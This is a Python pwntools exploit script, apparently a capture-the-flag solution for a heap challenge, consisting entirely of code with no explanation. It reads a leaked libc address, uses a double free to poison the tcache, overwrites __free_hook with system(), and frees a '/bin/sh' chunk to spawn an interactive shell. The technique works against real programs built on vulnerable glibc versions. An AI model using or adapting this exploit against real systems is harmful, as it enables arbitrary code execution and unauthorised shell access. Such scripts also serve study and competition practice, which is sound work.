#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./bin")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"size : ", str(size).encode())
    shell.sendlineafter(b"data : ", data)

def free(index):
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b"index : ", str(index).encode())

shell.recvuntil(b"regalito : ")
libc_base = int(shell.recvline().strip(), 16) - 0x6df20

malloc(24, b"A" * 8)

free(0)
free(0)

malloc(24, p64(libc_base + 0x3b28e8)) # __free_hook()
malloc(24, b"/bin/sh\x00")
malloc(24, p64(libc_base + 0x041b80)) # system()

free(0)

shell.recvline()
shell.interactive()
